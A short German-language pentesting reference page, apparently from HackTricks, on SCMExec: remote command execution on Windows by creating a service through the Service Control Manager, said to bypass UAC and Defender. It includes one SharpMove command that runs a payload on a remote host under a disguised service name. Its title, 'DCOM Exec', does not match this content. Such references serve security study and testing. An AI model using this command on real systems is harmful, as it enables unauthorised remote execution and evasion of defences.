# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** ist eine Technik zum Ausführen von Befehlen auf entfernten Systemen unter Verwendung des Service Control Manager (SCM), um einen Dienst zu erstellen, der den Befehl ausführt. Diese Methode kann einige Sicherheitskontrollen wie User Account Control (UAC) und Windows Defender umgehen.

## Werkzeuge

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## Referenzen

- [1] [SharpMove - GitHub-Repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
